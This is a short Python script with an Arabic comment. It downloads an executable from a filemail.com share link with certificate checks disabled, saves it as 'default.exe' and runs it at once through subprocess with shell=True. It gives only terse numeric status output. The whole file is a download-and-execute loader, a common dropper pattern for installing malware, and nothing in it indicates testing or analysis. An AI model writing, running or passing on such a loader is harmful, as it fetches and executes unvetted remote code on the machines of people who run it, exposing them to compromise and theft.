import requests
import subprocess

url = 'https://2019.filemail.com/api/file/get?filekey=8FRGhcmW4JAuiDL-bmcrfmOkdtJItwlmxcUANpyJCB7_rD2a7O1qCC6A7IEf'
myfile = requests.get(url, allow_redirects=True, verify=False)

if myfile.status_code == 200:
    with open("default.exe", "wb") as f:
        f.write(myfile.content)
    print("1")  

    # تشغيل الملف .exe باستخدام وحدة subprocess
    try:
        subprocess.run("default.exe", shell=True)
    except Exception as e:
        print("2", e)
else:
    print("2")
